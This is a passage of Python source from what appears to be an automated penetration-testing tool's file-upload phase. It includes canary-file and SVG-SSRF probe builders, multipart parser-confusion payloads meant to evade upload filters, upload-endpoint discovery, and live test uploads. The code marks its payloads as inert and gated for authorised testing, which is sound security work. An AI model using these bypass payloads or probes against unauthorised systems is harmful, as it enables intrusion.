    ct = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
          '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
          'content-types"><Default Extension="rels" ContentType="application/'
          'vnd.openxmlformats-package.relationships+xml"/><Default Extension='
          '"xml" ContentType="application/xml"/><Override PartName="/xl/'
          'workbook.xml" ContentType="application/vnd.openxmlformats-'
          'officedocument.spreadsheetml.sheet.main+xml"/></Types>')
    rels = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
            '2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
            'openxmlformats.org/officeDocument/2006/relationships/'
            'officeDocument" Target="xl/workbook.xml"/></Relationships>')
    wb = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
          '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/'
          '2006/main"><sheets><sheet name="canary" sheetId="1"/></sheets>'
          '<!-- %s --></workbook>' % canary)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", rels)
        z.writestr("xl/workbook.xml", wb)
    return buf.getvalue()


def odt_benign_bytes(canary):
    """Minimal benign ODT package (mimetype stored-first). INERT."""
    content = ('<?xml version="1.0" encoding="UTF-8"?>'
               '<office:document-content xmlns:office="urn:oasis:names:tc:'
               'opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:'
               'tc:opendocument:xmlns:text:1.0"><office:body><office:text>'
               '<text:p>%s</text:p></office:text></office:body>'
               '</office:document-content>' % canary)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(zipfile.ZipInfo("mimetype"),
                   "application/vnd.oasis.opendocument.text",
                   compress_type=zipfile.ZIP_STORED)
        z.writestr("content.xml", content)
    return buf.getvalue()


def html_inert_doc(canary):
    """Benign HTML doc - koi script/event-handler nahi (serve-CT census)."""
    return ("<html><head><title>%s</title></head><body><h1>%s</h1>"
            "<p>inert detection-only document</p></body></html>"
            % (canary, canary)).encode("utf-8", "ignore")


def svg_ssrf_bytes(canary, probe_path):
    """SVG-SSRF differential (RoE-GATED: files_allow_svg_ssrf). href SIRF
    same-origin relative path - zero external egress. Server-side SVG
    rasterizer href fetch kare to status/len/latency differential milta hai
    (content kabhi store nahi hota, redacted records only)."""
    if "://" in probe_path or "//" in probe_path.lstrip("/"):
        raise ValueError("svg-ssrf: sirf same-origin relative path allowed")
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32">'
            '<image href="%s" width="16" height="16"/>'
            '<text x="4" y="28">%s</text><!-- inert ssrf-diff probe --></svg>'
            % (probe_path, canary)).encode("utf-8", "ignore")


def svg_use_ref(canary):
    """SVG <use>+<foreignObject> census markers (koi execution nahi). INERT."""
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32">'
            '<use href="#waspP16mark"/><foreignObject width="8" height="8">'
            '</foreignObject><text x="4" y="28">%s</text></svg>'
            % canary).encode("utf-8", "ignore")


# ===========================================================================
# PAYLOAD LIBRARY 5 (v17): MULTIPART PARSER-CONFUSION BUILDERS (sab INERT)
# Har builder (body_bytes, content_type_header) return karta hai.
# ===========================================================================
def _pct(s):
    """Minimal percent-encoder (RFC5987 filename* ke liye)."""
    return "".join("%%%02X" % ord(c) if not (c.isalnum() or c in "._-")
                   else c for c in s)


def _mp_wrap(body, boundary):
    return body, "multipart/form-data; boundary=%s" % boundary


def _bnd():
    return "----waspP16mp" + rand_str(8)


def mp_rfc5987(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"fallback.png\"; filename*=UTF-8''%s\r\n"
            "Content-Type: %s\r\n\r\n" % (b, field, _pct(fname), ctype)
            ).encode("utf-8", "ignore") + content +         ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_dup_disposition(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"a.png\"\r\nContent-Disposition: form-data; "
            "name=\"%s\"; filename=\"%s\"\r\nContent-Type: %s\r\n\r\n"
            % (b, field, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_escaped_quotes(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"x\\\"y_%s\"\r\nContent-Type: %s\r\n\r\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_empty_filename(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"\"\r\nContent-Type: %s\r\n\r\n"
            % (b, field, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_no_filename(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n"
            "Content-Type: %s\r\n\r\n" % (b, field, ctype)
            ).encode("utf-8", "ignore") + content + \
        ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_two_files(field, fname, content, ctype, canary=None):
    b = _bnd()
    p = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
         "filename=\"f1_%s\"\r\nContent-Type: %s\r\n\r\n"
         % (b, field, fname, ctype)).encode("utf-8", "ignore") + content + \
        ("\r\n--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
         "filename=\"f2_%s\"\r\nContent-Type: image/png\r\n\r\n"
         % (b, field, fname)).encode("utf-8", "ignore") + content + \
        ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(p, b)


def mp_base64_cte(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: %s\r\n"
            "Content-Transfer-Encoding: base64\r\n\r\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        base64.b64encode(content) + \
        ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_bare_lf(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\nContent-Type: %s\n\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\n--%s--\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_cr_only(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\rContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\rContent-Type: %s\r\r"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r--%s--\r" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_preamble_epilogue(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("waspP16-preamble junk lines\nthis parser tolerance census hai\n"
            "--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: %s\r\n\r\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\nwaspP16-epilogue junk\n"
                   % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_zero_len(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: %s\r\n\r\n\r\n--%s--\r\n"
            % (b, field, fname, ctype, b)).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_dup_boundary(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: %s\r\n\r\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    body = body.replace(content, content + b"\r\ninjected:--" +
                        b.encode("utf-8", "ignore") + b"--", 1)
    return _mp_wrap(body, b)


def mp_ct_star(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: */*\r\n\r\n"
            % (b, field, fname)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_no_ct(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\n\r\n" % (b, field, fname)
            ).encode("utf-8", "ignore") + content + \
        ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


def mp_fake_headers(field, fname, content, ctype, canary=None):
    b = _bnd()
    body = ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: %s\r\n"
            "Content-Length: 99999\r\nX-Wasp-Ignore: 1\r\n\r\n"
            % (b, field, fname, ctype)).encode("utf-8", "ignore") + \
        content + ("\r\n--%s--\r\n" % b).encode("utf-8", "ignore")
    return _mp_wrap(body, b)


CONFUSION_BUILDERS = [
    ("rfc5987-filename-star", mp_rfc5987),
    ("dup-disposition", mp_dup_disposition),
    ("escaped-quote-fname", mp_escaped_quotes),
    ("empty-filename", mp_empty_filename),
    ("no-filename", mp_no_filename),
    ("two-files-same-field", mp_two_files),
    ("base64-cte", mp_base64_cte),
    ("bare-lf-eol", mp_bare_lf),
    ("cr-only-eol", mp_cr_only),
    ("preamble-epilogue", mp_preamble_epilogue),
    ("zero-length-file", mp_zero_len),
    ("dup-boundary-content", mp_dup_boundary),
    ("star-ct-part", mp_ct_star),
    ("no-ct-part", mp_no_ct),
    ("fake-part-headers", mp_fake_headers),
]


# ===========================================================================
# MULTIPART BUILDER (manual - full filename/CT control)
# ===========================================================================
def multipart_body(filefield, fname, content, ctype, fields=None, boundary=None):
    """multipart/form-data body bytes banao (HttpClient raw data bhejta hai).
    Returns (body_bytes, content_type_header)."""
    bnd = boundary or ("----waspP16" + rand_str(10))
    crlf = b"\r\n"
    L = []
    for name, val in (fields or []):
        L.append(("--" + bnd + crlf.decode()).encode("utf-8", "ignore"))
        L.append(('Content-Disposition: form-data; name="%s"%s%s'
                  % (name, crlf.decode(), crlf.decode())).encode("utf-8", "ignore"))
        L.append(str(val).encode("utf-8", "ignore") + crlf)
    L.append(("--" + bnd + crlf.decode()).encode("utf-8", "ignore"))
    L.append(('Content-Disposition: form-data; name="%s"; filename="%s"%s'
              % (filefield, fname, crlf.decode())).encode("utf-8", "ignore"))
    L.append(("Content-Type: %s%s%s" % (ctype, crlf.decode(),
                                        crlf.decode())).encode("utf-8", "ignore"))
    L.append(content if isinstance(content, bytes)
             else str(content).encode("utf-8", "ignore"))
    L.append((crlf.decode() + "--" + bnd + "--" + crlf.decode()).encode("utf-8", "ignore"))
    return b"".join(L), "multipart/form-data; boundary=%s" % bnd


def parse_multipart_filenames(body):
    """Debug/self-test helper: multipart body se filenames nikaalo."""
    txt = body if isinstance(body, str) else body.decode("utf-8", "ignore")
    return re.findall(r'filename="([^"]*)"', txt)

# ===========================================================================
# SEED-ARTIFACT HELPERS (P15 pattern)
# ===========================================================================
UPLOAD_PATH_RX = re.compile(
    r"(?i)(upload|fileup|attach|import|avatar|photo|media|image-up|imgup|"
    r"docs?/|/files?|/media|/assets/upload|editor|filemanager|fm/|dropzone|"
    r"plupload|fine-?uploader|fileinput|chunk|cv|resume|portrait|banner|"
    r"profile[-_]?pic|displaypic|dp/)")
FILE_PARAM_RX = re.compile(
    r"(?i)^(file|files|upload|image|img|photo|avatar|attachment|document|doc|"
    r"media|import|importfile|userfile|file_?data|blob|content|payload|"
    r"fileToUpload|files\[\]|file_?1|cv|resume|picture|pic|logo|banner)$")


def _read_json_tolerant(path):
    return load_json(path, default=None)


def _artifact(base_dir, mod, fname):
    """Tolerant artifact reader: missing file -> None (kabhi crash nahi)."""
    p = os.path.join(base_dir, mod, fname)
    if not os.path.isfile(p):
        return None
    if fname.endswith(".json"):
        return _read_json_tolerant(p)
    try:
        with open(p, "r", errors="ignore") as f:
            return f.read()
    except OSError:
        return None


def _iter_records(d):
    """JSON artifact -> iterable of dict records."""
    if isinstance(d, list):
        for x in d:
            if isinstance(x, dict):
                yield x
    elif isinstance(d, dict):
        for v in d.values():
            if isinstance(v, list):
                for x in v:
                    if isinstance(x, dict):
                        yield x
            elif isinstance(v, dict):
                yield v


def _url_from_rec(rec, prefer=("url", "endpoint", "action", "target", "href",
                              "page", "path", "link", "u")):
    for k in prefer:
        v = rec.get(k)
        if isinstance(v, str) and v.startswith(("http", "/")):
            return v
    return ""


def urljoin_safe(base_url, rel):
    try:
        return urllib.parse.urljoin(base_url, rel or "")
    except Exception:
        return rel or ""


def _norm_target(url, base_url):
    if not url:
        return ""
    if url.startswith("http"):
        return url.split("#")[0]
    return urljoin_safe(base_url, url).split("#")[0]


class _Rank:
    """Ranked surface accumulator (dedupe by url+kind)."""

    def __init__(self):
        self.items, self._seen = [], set()

    def add(self, kind, url, score, source, param="", method="POST", fields=None,
            extra=None):
        if not url or not url.startswith("http"):
            return
        k = (kind, url.split("?")[0], param)
        if k in self._seen:
            return
        self._seen.add(k)
        rec = {"kind": kind, "url": url, "score": round(min(10.0, score), 2),
               "source": source, "param": param, "method": method,
               "fields": fields or []}
        if extra:
            rec.update(extra)
        self.items.append(rec)

    def top(self, kind=None, cap=None):
        rows = [r for r in self.items if kind is None or r["kind"] == kind]
        rows.sort(key=lambda x: -x["score"])
        return rows[:cap] if cap else rows


# ===========================================================================
# STAGE A: DISCOVERY (evidence-first - P15/P5/P2/P7/P12/P9/P8-seeded)
# ===========================================================================
def discover_files_surface(base_dir, scope, conf):
    """Stage A: sab seed artifacts mine karo -> ranked upload/import targets.
    Returns (ranked, meta)."""
    base_dir = os.path.join(base_dir, scope.engagement)
    seeds = scope.seed_urls() or []
    base_urls = []
    for s in seeds:
        try:
            sp = urllib.parse.urlsplit(s)
            if sp.scheme and sp.netloc:
                base_urls.append("%s://%s" % (sp.scheme, sp.netloc))
        except Exception:
            continue
    base_url = base_urls[0] if base_urls else ""
    R = _Rank()
    meta = {"sources": [], "base_url": base_url, "upload_paths": [],
            "file_fields": [], "import_endpoints": [], "svg_endpoints": [],
            "form_hints": [], "param_hints": []}

    def src(name):
        if name not in meta["sources"]:
            meta["sources"].append(name)

    # ---- P15 feedforward: to_phase16_files (weight 1.0) ----
    p15ff = (_artifact(base_dir, "ssrf", "feedforward.json") or {}).get("routing", {})
    for u in (p15ff.get("to_phase16_files", {}) or {}).get("svg_doc_endpoints", [])[:10]:
        R.add("import", u, 9.5, "P15:ff:svg_doc_endpoints", param="file",
              extra={"parser_hint": True})
        meta["svg_endpoints"].append(u)
        src("P15:feedforward")
    for u in (p15ff.get("to_phase16_files", {}) or {}).get("traversal_confirmed",
                                                           [])[:6]:
        # download-style endpoints getback/path-analysis me kaam aate hain
        R.add("getback", u, 7.0, "P15:ff:traversal_confirmed", method="GET")
        src("P15:feedforward")

    # ---- P5 feedforward: to_phase16_upload paths (weight 0.95) ----
    p5ff = (_artifact(base_dir, "content", "feedforward.json") or {}).get("routing", {})
    for u in (p5ff.get("to_phase16_upload", {}) or {}).get("paths", [])[:20]:
        full = _norm_target(u, base_url)
        R.add("upload", full, 9.0, "P5:ff:upload_paths", param="file")
        meta["upload_paths"].append(full)
        src("P5:feedforward")

    # ---- P5 content artifacts: upload-ish paths (weight 0.85) ----
    for f in ("all_found.txt", "interesting.txt", "artifacts_high.txt"):
        txt = _artifact(base_dir, "content", f)
        if isinstance(txt, str):
            src("P5:content:" + f)
            for line in txt.splitlines():
                u = line.strip().split(" ")[0]
                if u and UPLOAD_PATH_RX.search(u) and len(meta["upload_paths"]) < 50:
                    full = _norm_target(u, base_url)
                    meta["upload_paths"].append(full)
                    kind = "import" if re.search(r"(?i)(import|xml|svg|parse|"
                                                 r"convert|docx|xlsx|office)", u) \
                        else "upload"
                    R.add(kind, full, 8.4, "P5:content", param="file")
        # upload_paths.json (agar P5 ne banaya)
        upj = _artifact(base_dir, "content", "upload_paths.json")
        for rec in _iter_records(upj):
            u = _url_from_rec(rec)
            if u:
                R.add("upload", _norm_target(u, base_url), 8.8, "P5:upload_paths",
                      param=rec.get("param", "file"))
                src("P5:upload_paths")

    # ---- P2 forms.json: multipart forms + file fields (weight 1.0) ----
    forms = _artifact(base_dir, "understand", "forms.json")
    for rec in _iter_records(forms):
        u = _url_from_rec(rec, prefer=("action", "url", "endpoint"))
        if not u:
            continue
        flds = rec.get("fields") or []
        file_fields = [f.get("name") for f in flds if isinstance(f, dict) and
                       (f.get("type") == "file" or FILE_PARAM_RX.match(
                           f.get("name", "")))]
        enctype = rec.get("enctype", "") or ""
        multipart = "multipart" in enctype.lower() or bool(file_fields) or \
            rec.get("has_file")
        if multipart:
            R.add("upload", u, 9.3, "P2:forms:multipart",
                  param=(file_fields[0] if file_fields else "file"),
                  fields=[f for f in file_fields if f],
                  extra={"enctype": enctype, "csrf_fields": rec.get("csrf_fields", [])})
            meta["form_hints"].append({"url": u, "fields": file_fields,
                                       "enctype": enctype})
            for ff in file_fields:
                if ff and ff not in meta["file_fields"]:
                    meta["file_fields"].append(ff)
            src("P2:forms")

    # ---- P7 js endpoints + params (weight 0.7) ----
    for f in ("endpoints.txt", "params.txt"):
        txt = _artifact(base_dir, "js", f)
        if isinstance(txt, str):
            src("P7:js:" + f)
            for line in txt.splitlines()[:200]:
                u = line.strip().split(" ")[0]
                if not u or len(u) < 6:
                    continue
                if UPLOAD_PATH_RX.search(u):
                    full = _norm_target(u, base_url)
                    R.add("upload", full, 7.8, "P7:js", param="file")
                    meta["upload_paths"].append(full)
                elif f == "params.txt":
                    p = u.strip()
                    if FILE_PARAM_RX.match(p) and p not in meta["param_hints"]:
                        meta["param_hints"].append(p)

    # ---- P12 reflection_map verbatim params (filename reflections, 0.8) ----
    for rec in _iter_records(_artifact(base_dir, "inject", "reflection_map.json")):
        u = _url_from_rec(rec)
        prm = rec.get("param", "")
        if u and (FILE_PARAM_RX.match(prm or "") or rec.get("verbatim")):
            R.add("upload", u, 8.2, "P12:reflection_map", param=prm or "file")
            src("P12:reflection_map")

    # ---- P9 auth endpoints (avatar/profile uploads, 0.7) ----
    for rec in _iter_records(_artifact(base_dir, "auth", "auth_endpoints.txt")):
        u = _url_from_rec(rec, prefer=("url", "endpoint"))
        if not u and isinstance(rec, dict):
            continue
    txt = _artifact(base_dir, "auth", "auth_endpoints.txt")
    if isinstance(txt, str):
        src("P9:auth_endpoints")
        for line in txt.splitlines():
            u = line.strip().split(" ")[0]
            if u and re.search(r"(?i)(avatar|profile|photo|picture|dp|cv|"
                               r"resume|kyc|document)", u):
                R.add("upload", _norm_target(u, base_url), 7.9, "P9:auth",
                      param="file")

    # ---- P8 priority queue (0.6) ----
    for rec in _iter_records(_artifact(base_dir, "surface", "priority_queue.json")):
        u = _url_from_rec(rec)
        if u and UPLOAD_PATH_RX.search(u):
            R.add("upload", u, 7.4, "P8:priority", param=rec.get("param", "file"))
            src("P8:priority")

    # ---- P15 xxe endpoints ko import pool me daalo (0.8) ----
    for rec in _iter_records(_artifact(base_dir, "ssrf", "xxe_surface.json")):
        u = rec.get("url") if isinstance(rec, dict) else ""
        if u and u.startswith("http"):
            R.add("import", u, 8.0, "P15:xxe_surface", param="file",
                  extra={"parser_hint": True})
            src("P15:xxe_surface")

    # ---- P3 sensitive params (filename-ish, 0.4) ----
    txt = _artifact(base_dir, "passive", "findings/sensitive_params.txt")
    if isinstance(txt, str):
        for line in txt.splitlines():
            p = line.strip()
            if FILE_PARAM_RX.match(p) and p not in meta["param_hints"]:
                meta["param_hints"].append(p)
                src("P3:sensitive_params")

    return R.top(cap=None), meta


# ===========================================================================
# STAGE B: UPLOAD-FORM CENSUS (baseline HTML se form structure nikaalo)
# ===========================================================================
_FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
_INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)
_FORM_OPEN_RE = re.compile(r"<form\b([^>]*)>", re.I)
_ATTR_RE = re.compile(r"""([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["']?([^"'\s>]*)""")


def _attrs_of(tag):
    return {k.lower(): v for k, v in _ATTR_RE.findall(tag or "")}


def parse_upload_forms(html, base_url):
    """HTML se multipart/file forms census (P2 parser ka upload-focused variant)."""
    forms = []
    for fm in _FORM_RE.finditer(html or ""):
        open_tag_m = _FORM_OPEN_RE.search(html[fm.start():fm.end() + 40])
        a = _attrs_of(open_tag_m.group(1)) if open_tag_m else {}
        action = urljoin_safe(base_url, a.get("action") or base_url)
        enctype = a.get("enctype", "")
        fields = []
        for im in _INPUT_RE.finditer(fm.group(1)):
            ia = _attrs_of(im.group(0))
            nm = ia.get("name")
            if not nm:
                continue
            fields.append({"name": nm, "type": (ia.get("type") or "text").lower(),
                           "value": ia.get("value", ""),
                           "accept": ia.get("accept", "")})
        file_fields = [f["name"] for f in fields if f["type"] == "file"]
        if not (file_fields or "multipart" in enctype.lower()):
            continue
        forms.append({
            "action": action, "method": (a.get("method") or "post").upper(),
            "enctype": enctype, "fields": fields,
            "file_fields": file_fields,
            "accept_hints": sorted({f["accept"] for f in fields if f["accept"]}),
            "csrf_fields": [f["name"] for f in fields if re.search(
                r"(csrf|xsrf|token|nonce|authenticity|requestverification)",
                f["name"], re.I)],
            "csrf_values": {f["name"]: f["value"] for f in fields if re.search(
                r"(csrf|xsrf|token|nonce|authenticity|requestverification)",
                f["name"], re.I) and f["value"]},
            "max_hints": (re.findall(
                r"(?i)(max[_-]?(?:file)?[_-]?size|MAX_FILE_SIZE)"
                r"[\"'\s:=]+(\d+)", fm.group(1)) + [
                ("max_file_size", v) for v in re.findall(
                    r"(?i)name=[\"']?(?:max[_-]?file[_-]?size|MAX_FILE_SIZE)"
                    r"[\"']?[^>]*?value=[\"']?(\d+)", fm.group(1))]),
        })
    return forms


def harvest_upload_forms(http, base_url, conf, cp, meta):
    """Cold-start: common upload pages GET karke multipart forms census."""
    paths = ["/", "/upload", "/uploads", "/file/upload", "/profile",
             "/settings", "/avatar", "/account/avatar", "/admin/upload",
             "/media/upload", "/import", "/attachment", "/documents/upload",
             "/file-manager", "/editor"]
    found = []
    for p in paths[:max(1, int(conf.get("files_cold_start", 12)))]:
        u = urljoin_safe(base_url, p)
        try:
            r = http.get(u, allow_redirects=True)
        except Exception:
            continue
        if r.status != 200 or not r.text:
            continue
        forms = parse_upload_forms(r.text, base_url)
        for fm in forms:
            fm["via"] = p
            found.append(fm)
        if interrupted():
            break
    meta["cold_forms"] = found
    return found

# ===========================================================================
# STAGE B HELPERS: baseline / calibration (P15 pattern)
# ===========================================================================
def quiet_client(http, cfg, scope, ev):
    """save_bodies=False client - upload/getback responses ka raw content
    evidence me kabhi store nahi hota (REDACT discipline, P15 pattern)."""
    q = copy.copy(cfg)
    q.save_bodies = False
    q.save_replays = False
    return HttpClient(q, ev, scope, label=NAME + "-quiet",
                      limiter=http.limiter, budget=http.budget)


def baseline_endpoint(http, url, conf, cp, meta, tag="b"):
    """2x GET baseline: status/len/sha1/stability + WAF sig (P15 pattern)."""
    rec = {"url": url, "tag": tag, "ok": False, "waf": None}
    try:
        r1 = http.get(url, allow_redirects=False)
        r2 = http.get(url, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 2
        if getattr(r1, "error", None):
            rec["error"] = truncate(str(r1.error), 120)
            return rec
        rec["status"] = r1.status
        rec["len"] = len(r1.body or b"")
        rec["sha1"] = r1.sha1()
        rec["stable"] = (r1.status == r2.status and r1.sha1() == r2.sha1())
        rec["waf"] = waf_signature(dict(r1.headers or {}),
                                   (r1.text or "")[:2000], r1.status)
        rec["title"] = truncate(title_of(r1.text or ""), 80)
        rec["ok"] = r1.status in (200, 301, 302, 401, 403)
    except Exception as e:
        rec["error"] = "%s: %s" % (type(e).__name__, truncate(str(e), 100))
    return rec


def pick_home_marker(http, base_url, meta):
    """Homepage sha1 marker (getback-differential anchor)."""
    try:
        r = http.get(base_url.rstrip("/") + "/", allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        if not getattr(r, "error", None) and r.status == 200 and r.body:
            return {"sha1": r.sha1(), "len": len(r.body), "url": base_url}
    except Exception:
        pass
    return None


def _sig(r):
    """Response -> compact signature (status/len/ct)."""
    try:
        ct = ""
        if hasattr(r, "header"):
            ct = r.header("Content-Type")
        return (r.status, len(r.body or b""), ct.split(";")[0].strip().lower())
    except Exception:
        return (0, 0, "")


def _is_waf_block(r, base_waf):
    """WAF-block heuristic (P15 pattern)."""
    if base_waf and r is not None:
        try:
            txt = (r.text or "")[:400]
            if r.status in (403, 406, 429) and waf_signature(
                    body=txt, status=r.status):
                return True
        except Exception:
            pass
    return False


# ===========================================================================
# UPLOAD RESPONSE ANALYSIS (success/failure/locate)
# ===========================================================================
SUCCESS_RX = re.compile(r"(?i)(uploaded|upload success|upload complete|"
                        r"file (has been|was) (saved|uploaded|received)|"
                        r"saved successfully|stored|success\"?\s*[:=]\s*true)")
FAILURE_RX = re.compile(r"(?i)(invalid|not allowed|forbidden|rejected|"
                        r"unsupported|wrong (type|format|extension)|must be "
                        r"(a|an) (image|pdf|file)|allowed (types|extensions)|"
                        r"failed to upload|error uploading|too large|"
                        r"exceeds|maximum size)")
JSON_URL_RX = re.compile(
    r'["\']?(?:url|path|file(?:_?path)?|filepath|link|location|target|uri|'
    r'src|download_url|secure_url|data)["\']?\s*:\s*["\']'
    r'(/[^"\']{4,180}|https?://[^"\'\s<>]{4,200})["\']', re.I)
URL_RX = re.compile(r"https?://[^\s\"'<>\\]{6,220}")
REL_PATH_RX = re.compile(r"""["']((?:\.?/)?(?:[\w.@-]+/)*[\w.@-]+\.(?:png|jpe?g|
    gif|svg|txt|pdf|docx?|xlsx?|mp4|webm|webp|bmp|ico))["']""", re.I | re.X)


def upload_success(r, fname, base_url):
    """Upload response success-signal score (0..3) + evidence bits."""
    body = r.text or ""
    hits = {"status": r.status in (200, 201, 202, 301, 302), "reflect": False,
            "msg": False, "json_url": False}
    if fname and fname.replace("\x00", "") in body:
        hits["reflect"] = True
    if SUCCESS_RX.search(body):
        hits["msg"] = True
    if JSON_URL_RX.search(body) or "upload" in (r.header("Location") or
                                                "").lower():
        hits["json_url"] = True
    score = sum(1 for v in hits.values() if v)
    return score, hits


def upload_failure(r):
    """Failure/WAF signal (extension-reject etc.)."""
    body = r.text or ""
    if r.status in (400, 403, 404, 405, 413, 415, 422):
        return True, ("status-%d" % r.status)
    if FAILURE_RX.search(body):
        return True, "message"
    return False, ""


def locate_uploaded_url(body_text, base_url, canary):
    """Upload response se file URL/path locate karo (canary-name anchored)."""
    cand = []
    low = (canary or "").lower().split("wasp")[1] if "wasp" in (canary or "") \
        else (canary or "").lower()
    for m in JSON_URL_RX.finditer(body_text or ""):
        cand.append(m.group(1))
    for m in URL_RX.finditer(body_text or ""):
        if low in m.group(0).lower():
            cand.append(m.group(0))
    for m in REL_PATH_RX.finditer(body_text or ""):
        if low in m.group(1).lower():
            cand.append(m.group(1))
    out = []
    for c in cand:
        full = _norm_target(c.strip().rstrip(".,;)"), base_url)
        if full not in out:
            out.append(full)
    return out[:5]


# ===========================================================================
# PARAM AUTODETECT (kaunsa multipart field file leta hai)
# ===========================================================================
def _upload_once(http, url, filefield, fname, content, ctype, fields=None,
                 gate_note=""):
    """Ek upload request (force_write=True - INERT canary discipline ke saath).
    Returns Resp ya error-Resp."""
    body, ct = multipart_body(filefield, fname, content, ctype, fields=fields)
    assert_inert(body, "upload-body[%s]" % fname)
    try:
        return http.post(url, data=body,
                         headers={"Content-Type": ct,
                                  "Accept": "*/*",
                                  "X-WASP-Probe": "P16-inert-upload"},
                         force_write=True, allow_redirects=False)
    except ScopeError:
        raise
    except Exception as e:
        class _E:
            status = 0
            body = b""
            text = ""
            elapsed = 0.0
        _E.text = "probe-error: %s" % truncate(str(e), 100)
        return _E()


def autodetect_file_param(http, url, conf, meta, form=None, other_fields=None):
    """Candidate field-names se benign png upload -> pehla success signal jeeta
    wo param. (P15 _fetch_url param-census ka upload variant.)"""
    canary = _canary("pa")
    content = magic_png(canary)
    cands = []
    if form and form.get("file_fields"):
        cands.extend(form["file_fields"])
    cands.extend(meta.get("file_fields", []))
    cands.extend(meta.get("param_hints", []))
    for c in str(conf.get("files_param_candidates", "file,upload,image")).split(","):
        c = c.strip()
        if c:
            cands.append(c)
    seen, tried = set(), []
    last_r = None
    fields = list((other_fields or [])[:4])
    for cand in cands:
        if not cand or cand in seen:
            continue
        seen.add(cand)
        tried.append(cand)
        r = _upload_once(http, url, cand, "%s.png" % canary.lower(), content,
                         "image/png", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        last_r = r
        score, _ = upload_success(r, canary.lower(), url)
        if score >= 2 or (score == 1 and r.status in (200, 201, 202)):
            return cand, r, tried, True
        if len(tried) >= 6:
            break
